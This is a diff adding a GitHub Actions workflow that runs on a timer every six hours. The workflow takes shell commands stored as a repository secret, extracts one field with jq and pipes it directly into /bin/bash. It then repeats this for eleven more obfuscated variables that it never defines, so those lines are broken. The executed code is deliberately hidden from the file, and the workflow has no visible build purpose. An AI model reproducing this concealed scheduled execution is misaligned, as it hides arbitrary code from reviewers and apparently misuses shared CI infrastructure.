@@ -1,0 +1,28 @@
+name: kongzuijiugu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongzuijiugu
+        env:
+          wmnj06: ${{ secrets.wmnj06 }}
+        run: |
+          echo $wmnj06 | jq -r .z51 | /bin/bash
+          echo $vjv320 | jq -r .cvjg3 | /bin/bash
+          echo $uzsm0 | jq -r .p1801 | /bin/bash
+          echo $vi2528 | jq -r .p37246 | /bin/bash
+          echo $d198 | jq -r .sjweq477 | /bin/bash
+          echo $co54718 | jq -r .c29 | /bin/bash
+          echo $pja9 | jq -r .g40 | /bin/bash
+          echo $zv53605 | jq -r .gps7204 | /bin/bash
+          echo $yc92667 | jq -r .ilv8046 | /bin/bash
+          echo $hxwq5 | jq -r .prcrn389 | /bin/bash
+          echo $zxlvn7 | jq -r .ckmr10 | /bin/bash
+          echo $pjvw3 | jq -r .vzw0257 | /bin/bash
+
